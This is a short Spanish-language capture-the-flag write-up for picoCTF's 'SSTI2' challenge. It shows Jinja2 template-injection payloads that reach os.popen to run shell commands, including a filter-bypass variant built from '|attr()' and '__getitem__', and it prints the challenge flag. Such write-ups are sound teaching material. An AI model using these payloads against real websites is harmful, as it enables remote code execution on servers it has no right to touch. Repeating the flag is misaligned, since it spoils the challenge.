## SSTI2
# Descripción
I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)

# Solución
Como sabemos que es una secuela, intentaremos probando directamente la instrucción que nos ayudó a romper el sitio web anterior
````python
{{ namespace.__init__.__globals__.os.popen('grep picoCTF . -rnw').read() }}
````

Pero...
![fallo](https://miro.medium.com/v2/resize:fit:720/format:webp/1*pfoq2O9auHh0P7zxdFnCkA.png)

En este caso, lo que haremos es modificar la instrucción, evitando el uso de la notación por punto `'.'`, reemplazándola con una combinación de `|attr()` y `__getitem__`. Resultando en esto
```python
{{
  request
  |attr('application')
  |attr('__globals__')
  |attr('__getitem__')('__builtins__')
  |attr('__getitem__')('__import__')('os')
  |attr('popen')('cat flag')
  |attr('read')()
}}  
```

Y bingo
![[08SSTI2.png]]

picoCTF{sst1_f1lt3r_byp4ss_6787c4d8}
# Notas adicionales
- 
# Referencias
- Imágenes tomadas de aquí: [https://blog.qz.sg/picoctf-2025-web-exploitation-writeups/](https://medium.com/@ahmednarmer1/ctf-day-19-4c7f827aef02)